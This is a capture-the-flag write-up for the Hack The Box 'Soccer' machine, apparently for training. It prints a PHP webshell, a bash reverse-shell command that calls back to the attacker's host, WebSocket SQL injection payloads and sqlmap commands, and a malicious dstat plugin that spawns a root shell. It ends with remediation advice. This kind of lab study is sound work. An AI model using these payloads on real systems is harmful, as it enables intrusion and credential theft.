# Soccer — SQL injection over WebSockets and a rogue dstat plugin

[![Difficulty](https://img.shields.io/badge/difficulty-Easy-green)](https://app.hackthebox.com/machines/soccer)
[![OS](https://img.shields.io/badge/OS-Linux-blue)](https://app.hackthebox.com/machines/soccer)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=V_CkT7xyiCc)

> **Attack path:** default Tiny File Manager credentials → PHP webshell as www-data → hidden `soc-player` vhost → blind SQLi through a WebSocket → plaintext `player` credentials → SSH as player → `doas` permits root `dstat` → malicious dstat plugin → root shell.

## 1 · Reconnaissance

### Port scan

```
nmap -p- --min-rate 10000 10.10.11.194
nmap -p 22,80,9091 -sCV 10.10.11.194
```

Three ports come back:

| Port | Service | Notes |
|------|---------|-------|
| 22 | OpenSSH 8.2p1 (Ubuntu 20.04) | nothing to do yet |
| 80 | nginx 1.18.0 | redirects to `soccer.htb` |
| 9091 | unknown "HTTP-ish" service | 404s plain GET requests (WebSocket) |

Add the hostname:

```
echo "10.10.11.194 soccer.htb" | sudo tee -a /etc/hosts
```

### Web enumeration

`soccer.htb` is a static "HTB Football Club" page with no links and no interesting headers. Subdomain brute-forcing on ports 80 and 9091 (`ffuf -H "Host: FUZZ.soccer.htb"`) finds nothing — remember this for later. Directory brute-forcing does pay off:

```
feroxbuster -u http://soccer.htb
```

Two hits stand out: `/tiny` (301) and `/tiny/uploads` — an installation of **Tiny File Manager**, a single-file PHP file manager.

## 2 · Foothold

### Default credentials

`/tiny/` serves the Tiny File Manager login (`/tiny/tinyfilemanager.php`). The upstream GitHub README documents the default accounts `admin:admin@123` and `user:12345`. Both still work here — log in as `admin`.

### Webshell upload

Uploading into the web root (`/var/www/html/`) fails, but the `uploads` directory accepts writes. Navigate to `/tiny/uploads` in the UI, then upload a PHP webshell `cmd.php`:

```php
<?php system($_REQUEST["cmd"]); ?>
```

Trigger it (note the URL-encoded `&` in the reverse shell):

```
curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=id'
# uid=33(www-data) gid=33(www-data)

curl http://soccer.htb/tiny/uploads/cmd.php \
  -d 'cmd=bash -c "bash -i >%26 /dev/tcp/<vpn-ip>/443 0>%261"'
```

With `nc -lnvp 443` listening, this yields a shell as `www-data`. Upgrade it with the usual `script /dev/null -c bash` and `stty` trick.

## 3 · User flag

### Finding the hidden vhost

The static site has no database and no credentials, so pivot to configuration files:

```
ls /etc/nginx/sites-enabled/
# default  soc-player.htb

cat /etc/nginx/sites-enabled/soc-player.htb
```

The file defines a second virtual host, `soc-player.soccer.htb`, proxying to a Node/Express app on `localhost:3000` — invisible from outside because vhost fuzzing never guessed it. Add it to `/etc/hosts`:

```
10.10.11.194 soccer.htb soc-player.soccer.htb
```

### The WebSocket ticket check

Register an account on `soc-player.soccer.htb`, log in, and open `/check`. The page issues a ticket ID, and client-side JavaScript opens a WebSocket to `ws://soc-player.soccer.htb:9091`. Burp's **WebSockets history** tab shows the frames sent when you submit a ticket number:

```json
{"id": "1234"}
```

The server answers either "Ticket Exists" or "Ticket Doesn't Exist" — a perfect boolean oracle.

### Manual blind SQLi

The `id` is used in an integer context, so no quote is needed to break out:

```json
{"id": "0 or 1=1-- -"}            -> Ticket Exists
{"id": "0 UNION SELECT 1,2,3-- -"} -> Ticket Exists (three columns)
{"id": "0 UNION SELECT 1,2"}       -> Ticket Doesn't Exist (error swallowed)
```

With the column count known, you can ask arbitrary questions of the database:

```json
{"id": "0 UNION select user,2,3 from mysql.user where user like 'r%'-- -"}
```

`r%` returns true — there is a MySQL user starting with "r" (root). Character-by-character extraction works but is painfully slow by hand.

### sqlmap over WebSocket

`sqlmap` natively supports `ws://` targets (it needs `pip install websocket-client`):

```
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' \
       --dbms mysql --batch --level 5 --risk 3
```

`--level 5 --risk 3` matters: without it sqlmap only finds the time-based blind injection, which is far slower than the boolean one. Then enumerate:

```
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql \
       --batch --level 5 --risk 3 --threads 10 --dbs
# information_schema, mysql, performance_schema, soccer_db, sys

sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql \
       --batch --level 5 --risk 3 --threads 10 -D soccer_db --tables
# accounts

sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql \
       --batch --level 5 --risk 3 --threads 10 -D soccer_db -T accounts --dump
```

The single `accounts` row holds `player` with a **plaintext** password:

```
| id   | email            | password          | username |
| 1324 | player@player.htb| <password>        | player   |
```

### Shell as player

```
su player -                # from the www-data shell, or from outside:
sshpass -p '<password>' ssh player@soccer.htb
cat /home/player/user.txt  # <user-flag>
```

## 4 · Privilege escalation

### doas rule

`sudo -l` gives nothing, but searching for SetUID binaries surfaces something unusual:

```
find / -perm -4000 2>/dev/null
# /usr/local/bin/doas  ...
find / -name doas.conf 2>/dev/null
# /usr/local/etc/doas.conf

cat /usr/local/etc/doas.conf
# permit nopass player as root cmd /usr/bin/dstat
```

`doas` is OpenBSD's sudo alternative, and `player` may run exactly one binary as root: `dstat`, a system statistics tool.

### Malicious dstat plugin

The `dstat` man page lists the paths it searches for external plugins named `dstat_*.py`, including `/usr/local/share/dstat` — which is writable by `player`. When `doas` runs dstat as root, it loads plugins *as root*:

```
echo -e 'import os\n\nos.system("/bin/bash")' \
  > /usr/local/share/dstat/dstat_pwn.py

doas /usr/bin/dstat --pwn
# (DeprecationWarning from the imp module is harmless)
root@soccer:/home/player#
```

A copy of `/bin/bash` with the SetUID bit (`cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash`) works equally well if you prefer a non-interactive artifact.

## 5 · Root flag / Domain Admin

```
root@soccer:~# cat /root/root.txt   # <root-flag>
```

## 6 · Impact & remediation

| Risk | Impact | Remediation |
|------|--------|-------------|
| Default credentials on Tiny File Manager | Unauthenticated file upload, immediate webshell as www-data | Change/remove vendor default accounts; keep admin file managers off internet-facing hosts |
| Unrestricted upload into a PHP-executable path | Remote code execution | Validate extension and content, store uploads outside the webroot, disable script execution in upload dirs |
| SQL injection on the WebSocket ticket lookup | Full database dump including a plaintext password reused for SSH | Parameterized queries on every transport (including WS); never store plaintext passwords |
| Over-broad `doas` rule (`/usr/bin/dstat` as root) | Instant root — dstat plugins are arbitrary Python | Drop the rule or replace dstat with a read-only wrapper; treat plugin-loading tools like code execution |

## 7 · CPTS takeaways

- sqlmap speaks `ws://` natively — give it the WebSocket URL and the JSON body via `--data`, and bump `--level`/`--risk` to reach the boolean injection instead of the slow time-based one.
- Burp's WebSocket history makes WS traffic a first-class attack surface: replay and fuzz frames exactly like HTTP requests.
- Host-header-based vhosts that fuzzing misses are routinely exposed post-foothold by reading `/etc/nginx/sites-enabled` — always enumerate the web server config once you land.
- On Linux privesc, check for `doas` (SetUID binary + `doas.conf`) in addition to `sudo -l`; whole-binary doas rules on extensible tools (dstat plugins, etc.) are equivalent to handing out root.
- Integer-context SQLi often needs no quote — test `or 1=1-- -` before assuming strings.
